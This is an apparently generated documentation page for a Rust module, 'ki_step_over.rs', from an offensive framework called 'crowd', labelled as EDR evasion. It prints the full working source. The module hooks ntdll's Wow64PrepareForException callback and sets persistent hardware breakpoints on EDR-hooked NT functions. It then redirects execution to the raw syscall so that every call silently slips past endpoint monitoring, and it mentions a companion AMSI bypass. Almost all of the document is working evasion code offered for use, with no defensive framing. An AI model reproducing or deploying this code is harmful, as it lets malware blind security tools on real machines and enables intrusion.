# crowd — ki_step_over.rs  (🔥 S TIER)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/ki_step_over.rs` |
| **Lines** | 528 |
| **Tier** | S |
| **Cards** | T009-edr-evasion |
| **Role** | KiUserExceptionDispatcher StepOver |
| **Unsafe blocks** | 14 |

## Purpose

# crowd — ki_step_over.rs  (🔥 S TIER)

## KiUserExceptionDispatcher StepOver

Bypasses EDR inline hooks silently. Instead of unhooking (which alerts
telemetry), we set a Hardware Breakpoint (DR0) on the hooked instruction.
When the thread hits it, `KiUserExceptionDispatcher` fires. We intercept
the exception via the `Wow64PrepareForException` callback pointer in
ntdll's `.rdata`, set RAX = SSN and RIP = syscall instruction, then
resume via NtContinue.  100 % silent bypass.

**Conflict note**: This uses DR0.  crowd's AMSI-HBP (`amsi_hbp.rs`) also
uses DR0.  Call `ki_step_over` functions **after** AMSI-HBP has been
installed and triggered (DR0 is freed post-trigger in our AMSI flow).

## Constants

- `STATUS_SINGLE_STEP`: `u32` = `0x80000004`
- `CONTEXT_DEBUG_REGISTERS`: `u32` = `0x00100010` — AMD64 context flags

## Types

### struct `FunctionEntry` (line 34)
Address table: which NT functions are being step-over'd.
The exception handler checks RIP against these to return the correct SSN.

### struct `CONTEXT_AMD64` (line 58)

### struct `ExceptionRecord` (line 189)

## Public API

### `exception_handler` (line 126)
```rust
pub extern "system" fn exception_handler(
```

### `set_hardware_breakpoint_dr` (line 235)
```rust
pub fn set_hardware_breakpoint_dr(target_addr: u64, dr_index: u8)
```

### `set_hardware_breakpoint` (line 289)
```rust
pub fn set_hardware_breakpoint(target_addr: u64)
```

### `hook_exception_dispatcher` (line 299)
```rust
pub fn hook_exception_dispatcher() -> *mut c_void
```
Hooks ntdll's `Wow64PrepareForException` callback pointer in .rdata to
redirect exception handling to our `exception_handler`.

Returns the pointer to the callback slot (needed for unhook).

### `unhook_exception_dispatcher` (line 338)
```rust
pub fn unhook_exception_dispatcher(callback_slot: *mut c_void) -> bool
```
Restores the original `Wow64PrepareForException` callback (unhook).

### `register_step_over` (line 368)
```rust
pub fn register_step_over(func_name: &str) -> bool
```
Registers a function for step-over bypass.  Uses crowd's resolve.rs to
get the SSN, then configures the table entry.

Returns `true` if the function is hooked (has 0xE9 at +3) and was registered.

### `install_step_over` (line 497)
```rust
pub fn install_step_over(functions: &[&str]) -> usize
```
Installs the KiUserExceptionDispatcher StepOver bypass for the given
NT functions.  Only functions that are actually hooked by an EDR will
have the bypass installed.

Uses DR0-DR3 (up to 4 concurrent hardware breakpoints).  Breakpoints
are now **persistent** — they re-arm after each hit so every call to
the hooked function is silently bypassed, not just the first.

Returns the number of functions that were hooked and bypassed.

## Internal Functions

- `get_nt_continue` (line 95)
- `lookup_ssn` (line 200)
- `find_syscall_instruction` (line 212)
- `find_wow64_callback_pointer` (line 412)

## Key Dependencies

- `use crate::mega_dbg;`

## Full Source

```rust
//! # crowd — ki_step_over.rs  (🔥 S TIER)
//!
//! ## KiUserExceptionDispatcher StepOver
//!
//! Bypasses EDR inline hooks silently. Instead of unhooking (which alerts
//! telemetry), we set a Hardware Breakpoint (DR0) on the hooked instruction.
//! When the thread hits it, `KiUserExceptionDispatcher` fires. We intercept
//! the exception via the `Wow64PrepareForException` callback pointer in
//! ntdll's `.rdata`, set RAX = SSN and RIP = syscall instruction, then
//! resume via NtContinue.  100 % silent bypass.
//!
//! **Conflict note**: This uses DR0.  crowd's AMSI-HBP (`amsi_hbp.rs`) also
//! uses DR0.  Call `ki_step_over` functions **after** AMSI-HBP has been
//! installed and triggered (DR0 is freed post-trigger in our AMSI flow).

#![allow(dead_code, non_snake_case)]

use std::ffi::c_void;
use std::ptr::{self, null_mut};
use std::sync::atomic::{AtomicPtr, AtomicU64, Ordering};

#[allow(unused_imports)]
use crate::mega_dbg;

// ── Type aliases (adapted from Tsukuyomi — no dinvk dep) ──────────────────

type NtContinueFn = unsafe extern "system" fn(*mut CONTEXT_AMD64, u8) -> i32;

/// Cached NtContinue pointer (resolved once via GetProcAddress).
static NT_CONTINUE_PTR: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());

/// Address table: which NT functions are being step-over'd.
/// The exception handler checks RIP against these to return the correct SSN.
struct FunctionEntry {
    address: AtomicU64,
    ssn:     u32,
}

/// Up to 8 simultaneous step-over targets.
static FUNC_TABLE: [FunctionEntry; 8] = [
    FunctionEntry { address: AtomicU64::new(0), ssn: 0 },
    FunctionEntry { address: AtomicU64::new(0), ssn: 0 },
    FunctionEntry { address: AtomicU64::new(0), ssn: 0 },
    FunctionEntry { address: AtomicU64::new(0), ssn: 0 },
    FunctionEntry { address: AtomicU64::new(0), ssn: 0 },
    FunctionEntry { address: AtomicU64::new(0), ssn: 0 },
    FunctionEntry { address: AtomicU64::new(0), ssn: 0 },
    FunctionEntry { address: AtomicU64::new(0), ssn: 0 },
];

/// Mutable SSN table (set at runtime before hooking).
static mut SSN_TABLE: [u32; 8] = [0; 8];
static mut TABLE_COUNT: usize = 0;

// ── Minimal CONTEXT for x86_64 (only fields we touch) ─────────────────────

#[repr(C, align(16))]
struct CONTEXT_AMD64 {
    _p1: [u64; 6],
    ContextFlags: u32,
    _mxcsr: u32,
    _seg: [u16; 6],
    _eflags: u32,
    Dr0: u64,
    Dr1: u64,
    Dr2: u64,
    Dr3: u64,
    Dr6: u64,
    Dr7: u64,
    Rax: u64,
    Rcx: u64,
    Rdx: u64,
    Rbx: u64,
    Rsp: u64,
    Rbp: u64,
    Rsi: u64,
    Rdi: u64,
    R8:  u64,
    R9:  u64,
    R10: u64,
    R11: u64,
    R12: u64,
    R13: u64,
    R14: u64,
    R15: u64,
    Rip: u64,
    _rest: [u8; 1024],
}

const STATUS_SINGLE_STEP: u32 = 0x80000004;
const CONTEXT_DEBUG_REGISTERS: u32 = 0x00100010; // AMD64 context flags

// ── NtContinue resolution ─────────────────────────────────────────────────

fn get_nt_continue() -> Option<NtContinueFn> {
    let ptr = NT_CONTINUE_PTR.load(Ordering::Relaxed);
    if !ptr.is_null() {
        return Some(unsafe { std::mem::transmute(ptr) });
    }
    unsafe {
        let ntdll = winapi::um::libloaderapi::GetModuleHandleA(
            b"ntdll.dll\0".as_ptr() as *const i8,
        );
        if ntdll.is_null() { return None; }
        let proc = winapi::um::libloaderapi::GetProcAddress(
            ntdll,
            b"NtContinue\0".as_ptr() as *const i8,
        );
        if proc.is_null() { return None; }
        NT_CONTINUE_PTR.store(proc as *mut c_void, Ordering::Relaxed);
        Some(std::mem::transmute(proc))
    }
}

// ── Exception handler ─────────────────────────────────────────────────────
//
// Installed by overwriting the `Wow64PrepareForException` callback pointer
// in ntdll's .rdata section.  When STATUS_SINGLE_STEP fires with
// RIP matching any DR0-DR3 hardware breakpoint, we:
//   1. Leave DR0-DR3 intact (persistent — re-arms for every call)
//   2. Clear DR6 status bits (acknowledge breakpoint event)
//   3. Set RAX = SSN of the target function
//   4. Set RIP = syscall instruction (0F 05) — past the EDR hook
//   5. NtContinue to resume execution

pub extern "system" fn exception_handler(
    exception_record: *mut ExceptionRecord,
    context_record: *mut CONTEXT_AMD64,
) -> *mut c_void {
    let Some(nt_continue) = get_nt_continue() else {
        return ptr::null_mut();
    };

    unsafe {
        if (*exception_record).ExceptionCode != STATUS_SINGLE_STEP {
            return ptr::null_mut();
        }

        let rip = (*context_record).Rip;

        // Check if RIP matches ANY of our active hardware breakpoints (DR0-DR3)
        let dr_regs = [
            (*context_record).Dr0,
            (*context_record).Dr1,
            (*context_record).Dr2,
            (*context_record).Dr3,
        ];
        let matched = dr_regs.iter().any(|&dr| dr == rip && dr != 0);
        if !matched {
            return ptr::null_mut();
        }

        // Find matching SSN from our table
        let base_addr = rip - 3; // hooked instruction is at func+3 (after mov r10,rcx; B8)
        let ssn = lookup_ssn(base_addr);
        let syscall_addr = find_syscall_instruction(rip);

        if ssn == 0 || syscall_addr == 0 {
            return ptr::null_mut();
        }

        mega_dbg!("KiStepOver: intercepted hook at 0x{:x}, SSN=0x{:x}, syscall@0x{:x}",
            rip, ssn, syscall_addr);

        // RE-ARM DR0 — keep the breakpoint active for future calls.
        // Old code cleared DR0 here (one-shot), meaning only the first
        // syscall call was bypassed. Now we leave DR0 intact so every
        // subsequent call to the same NT function also fires the HWBP.
        // DR7 is also preserved (already set from set_hardware_breakpoint).
        // (*context_record).Dr0 = 0;  // ← REMOVED: was one-shot

        // Set SSN in RAX
        (*context_record).Rax = ssn as u64;
        // Jump past the hook to the syscall instruction
        (*context_record).Rip = syscall_addr;

        // Clear DR6 status bits to acknowledge the breakpoint event,
        // otherwise Windows may re-fire the exception immediately.
        (*context_record).Dr6 = 0;

        // Resume
        nt_continue(context_record, 0);
    }

    ptr::null_mut()
}

#[repr(C)]
pub struct ExceptionRecord {
    pub ExceptionCode: u32,
    pub ExceptionFlags: u32,
    pub ExceptionRecord: *mut ExceptionRecord,
    pub ExceptionAddress: *mut c_void,
    pub NumberParameters: u32,
    pub ExceptionInformation: [u64; 15],
}

// ── SSN lookup ────────────────────────────────────────────────────────────

fn lookup_ssn(nt_function_address: u64) -> u32 {
    unsafe {
        for i in 0..TABLE_COUNT {
            if FUNC_TABLE[i].address.load(Ordering::Relaxed) == nt_function_address {
                return SSN_TABLE[i];
            }
        }
    }
    // Fallback: use crowd's resolve.rs
    0
}

fn find_syscall_instruction(from: u64) -> u64 {
    for i in 0u64..25 {
        let ptr = (from + i) as *const u8;
        unsafe {
            if *ptr == 0x0F && *(ptr.add(1)) == 0x05 {
                return from + i;
            }
        }
    }
    0
}

// ── Hardware Breakpoint via RtlCaptureContext + NtContinue ─────────────────

/// Sets a hardware breakpoint on the given address using the specified DR register (0-3).
/// The address should be the hook instruction (func + 3, where the EDR JMP is).
///
/// DR7 encoding (Local Enable bits):
///   DR0: bit 0  (0x01)
///   DR1: bit 2  (0x04)
///   DR2: bit 4  (0x10)
///   DR3: bit 6  (0x40)
#[inline(never)]
pub fn set_hardware_breakpoint_dr(target_addr: u64, dr_index: u8) {
    if dr_index > 3 {
        mega_dbg!("KiStepOver: invalid DR index {}", dr_index);
        return;
    }

    let Some(nt_continue) = get_nt_continue() else {
        mega_dbg!("KiStepOver: NtContinue not found — cannot set HW BP");
        return;
    };

    // Verify the instruction at target_addr is a hook (0xE9 = JMP rel32)
    let hook_addr = target_addr;
    let is_hooked = unsafe { *(hook_addr as *const u8) == 0xE9 };
    if !is_hooked {
        mega_dbg!("KiStepOver: addr 0x{:x} not hooked (no 0xE9 JMP) — skipping", hook_addr);
        return;
    }

    mega_dbg!("KiStepOver: setting DR{} breakpoint at 0x{:x}", dr_index, hook_addr);

    unsafe {
        let rtl_capture: unsafe extern "system" fn(*mut CONTEXT_AMD64) = std::mem::transmute(
            winapi::um::libloaderapi::GetProcAddress(
                winapi::um::libloaderapi::GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8),
                b"RtlCaptureContext\0".as_ptr() as *const i8,
            ),
        );

        let mut ctx: CONTEXT_AMD64 = std::mem::zeroed();
        rtl_capture(&mut ctx);

        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

        // Set the target address in the requested DR register
        match dr_index {
            0 => ctx.Dr0 = hook_addr,
            1 => ctx.Dr1 = hook_addr,
            2 => ctx.Dr2 = hook_addr,
            3 => ctx.Dr3 = hook_addr,
            _ => unreachable!(),
        }

        // Enable local breakpoint for the specified DR register
        // Preserve existing enables and OR-in the new one
        let enable_bit: u64 = 1u64 << (dr_index * 2);
        ctx.Dr7 |= enable_bit;

        nt_continue(&mut ctx, 0);
    }
}

/// Legacy single-DR0 wrapper for backward compatibility
#[inline(never)]
pub fn set_hardware_breakpoint(target_addr: u64) {
    set_hardware_breakpoint_dr(target_addr, 0);
}

// ── Wow64PrepareForException hooking ──────────────────────────────────────

/// Hooks ntdll's `Wow64PrepareForException` callback pointer in .rdata to
/// redirect exception handling to our `exception_handler`.
///
/// Returns the pointer to the callback slot (needed for unhook).
pub fn hook_exception_dispatcher() -> *mut c_void {
    let (ntdll_base, _) = crate::resolve::ntdll_base_and_name_hashes();
    if ntdll_base.is_null() {
        mega_dbg!("KiStepOver: ntdll base not found");
        return ptr::null_mut();
    }

    let callback_ptr = find_wow64_callback_pointer(ntdll_base);
    if callback_ptr.is_null() {
        mega_dbg!("KiStepOver: Wow64PrepareForException not found in .rdata");
        return ptr::null_mut();
    }

    mega_dbg!("KiStepOver: Wow64PrepareForException at {:p}", callback_ptr);

    unsafe {
        let mut old_protect: u32 = 0;
        winapi::um::memoryapi::VirtualProtect(
            callback_ptr as *mut winapi::ctypes::c_void,
            std::mem::size_of::<usize>(),
            winapi::um::winnt::PAGE_READWRITE,
            &mut old_protect,
        );

        *(callback_ptr as *mut usize) = exception_handler as usize;

        winapi::um::memoryapi::VirtualProtect(
            callback_ptr as *mut winapi::ctypes::c_void,
            std::mem::size_of::<usize>(),
            winapi::um::winnt::PAGE_READONLY,
            &mut old_protect,
        );
    }

    mega_dbg!("KiStepOver: exception dispatcher hooked");
    callback_ptr as *mut c_void
}

/// Restores the original `Wow64PrepareForException` callback (unhook).
pub fn unhook_exception_dispatcher(callback_slot: *mut c_void) -> bool {
    if callback_slot.is_null() { return false; }

    unsafe {
        let mut old_protect: u32 = 0;
        if winapi::um::memoryapi::VirtualProtect(
            callback_slot as *mut winapi::ctypes::c_void,
            std::mem::size_of::<usize>(),
            winapi::um::winnt::PAGE_READWRITE,
            &mut old_protect,
        ) == 0 {
            return false;
        }

        *(callback_slot as *mut *mut c_void) = ptr::null_mut();

        winapi::um::memoryapi::VirtualProtect(
            callback_slot as *mut winapi::ctypes::c_void,
            std::mem::size_of::<usize>(),
            winapi::um::winnt::PAGE_READONLY,
            &mut old_protect,
        );
    }
    true
}

/// Registers a function for step-over bypass.  Uses crowd's resolve.rs to
/// get the SSN, then configures the table entry.
///
/// Returns `true` if the function is hooked (has 0xE9 at +3) and was registered.
pub fn register_step_over(func_name: &str) -> bool {
    let hash = crate::resolve::compute_hash(func_name);
    let (ssn, _gadget) = crate::resolve::resolve_ssn_by_hash(hash);
    if ssn == 0 {
        mega_dbg!("KiStepOver: resolve_ssn failed for '{}'", func_name);
        return false;
    }

    // Get function address via GetProcAddress
    let func_addr = unsafe {
        let ntdll = winapi::um::libloaderapi::GetModuleHandleA(
            b"ntdll.dll\0".as_ptr() as *const i8,
        );
        let mut name_buf = func_name.as_bytes().to_vec();
        name_buf.push(0);
        winapi::um::libloaderapi::GetProcAddress(ntdll, name_buf.as_ptr() as *const i8) as u64
    };

    if func_addr == 0 {
        return false;
    }

    // Check if function is hooked (0xE9 at offset +3)
    let hook_addr = func_addr + 3;
    let is_hooked = unsafe { *(hook_addr as *const u8) == 0xE9 };
    if !is_hooked {
        mega_dbg!("KiStepOver: '{}' not hooked — no bypass needed", func_name);
        return false;
    }

    unsafe {
        let idx = TABLE_COUNT;
        if idx >= 8 { return false; }
        FUNC_TABLE[idx].address.store(func_addr, Ordering::Relaxed);
        SSN_TABLE[idx] = ssn;
        TABLE_COUNT += 1;
    }

    mega_dbg!("KiStepOver: registered '{}' SSN=0x{:x} hook_addr=0x{:x}", func_name, ssn, hook_addr);
    true
}

// ── .rdata scanner for Wow64PrepareForException ───────────────────────────

fn find_wow64_callback_pointer(ntdll_base: *const u8) -> *const u8 {
    let target = b"Wow64PrepareForException";

    unsafe {
        let dos = ntdll_base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
        let nt = ntdll_base.add((*dos).e_lfanew as usize)
            as *const winapi::um::winnt::IMAGE_NT_HEADERS64;

        let section_count = (*nt).FileHeader.NumberOfSections;
        let first_section = (nt as *const u8)
            .add(std::mem::size_of::<winapi::um::winnt::IMAGE_NT_HEADERS64>())
            as *const winapi::um::winnt::IMAGE_SECTION_HEADER;

        for i in 0..section_count as usize {
            let section = &*first_section.add(i);
            let name_bytes = &section.Name;
            if name_bytes[0] != b'.' || name_bytes[1] != b'r' ||
               name_bytes[2] != b'd' || name_bytes[3] != b'a' {
                continue;
            }

            let rva = section.VirtualAddress as usize;
            let vsize = *section.Misc.VirtualSize() as usize;
            let section_ptr = ntdll_base.add(rva);

            // Scan .rdata for ANSI_STRING pointing to "Wow64PrepareForException"
            let entry_size = std::mem::size_of::<u64>();
            if vsize < entry_size { break; }
            let count = (vsize - 8) / entry_size;

            for j in 0..count {
                let candidate = *(section_ptr.add(j * entry_size) as *const u64);
                let cand_ptr = candidate as *const u8;

                // Validate pointer is within ntdll image
                let image_size = (*nt).OptionalHeader.SizeOfImage as usize;
                if (cand_ptr as usize) < (ntdll_base as usize)
                    || (cand_ptr as usize) >= (ntdll_base as usize + image_size)
                {
                    continue;
                }

                // Check if it points to an ANSI_STRING-like structure
                // ANSI_STRING: Length(u16) + MaxLength(u16) + Buffer(*i8)
                let len = *(cand_ptr as *const u16);
                let max_len = *(cand_ptr.add(2) as *const u16);
                if len != target.len() as u16 || max_len != (target.len() + 1) as u16 {
                    continue;
                }

                let buf_ptr = *(cand_ptr.add(if cfg!(target_arch = "x86_64") { 8 } else { 4 })
                    as *const *const u8);
                if buf_ptr.is_null() { continue; }
                if (buf_ptr as usize) < (ntdll_base as usize)
                    || (buf_ptr as usize) >= (ntdll_base as usize + image_size)
                {
                    continue;
                }

                // Compare string content
                let name_slice = std::slice::from_raw_parts(buf_ptr, len as usize);
                if name_slice == target {
                    // The function pointer is the NEXT qword
                    let func_ptr_slot = section_ptr.add((j + 1) * entry_size);
                    return func_ptr_slot;
                }
            }
            break;
        }
    }

    ptr::null()
}

// ── High-level API: step-over a list of NT functions ──────────────────────

/// Installs the KiUserExceptionDispatcher StepOver bypass for the given
/// NT functions.  Only functions that are actually hooked by an EDR will
/// have the bypass installed.
///
/// Uses DR0-DR3 (up to 4 concurrent hardware breakpoints).  Breakpoints
/// are now **persistent** — they re-arm after each hit so every call to
/// the hooked function is silently bypassed, not just the first.
///
/// Returns the number of functions that were hooked and bypassed.
pub fn install_step_over(functions: &[&str]) -> usize {
    let slot = hook_exception_dispatcher();
    if slot.is_null() {
        mega_dbg!("KiStepOver: failed to hook exception dispatcher");
        return 0;
    }

    let mut count = 0u8;
    for func in functions {
        if count >= 4 {
            mega_dbg!("KiStepOver: DR0-DR3 all used — cannot register more functions");
            break;
        }
        if register_step_over(func) {
            let func_addr = unsafe {
                let ntdll = winapi::um::libloaderapi::GetModuleHandleA(
                    b"ntdll.dll\0".as_ptr() as *const i8,
                );
                let mut name_buf = func.as_bytes().to_vec();
                name_buf.push(0);
                winapi::um::libloaderapi::GetProcAddress(ntdll, name_buf.as_ptr() as *const i8) as u64
            };
            // Distribute across DR0-DR3 so up to 4 functions can be bypassed simultaneously
            set_hardware_breakpoint_dr(func_addr + 3, count);
            count += 1;
        }
    }

    mega_dbg!("KiStepOver: {} de {} funciones bypass'd (DR0-DR{})",
        count, functions.len(), if count > 0 { count - 1 } else { 0 });
    count as usize
}

```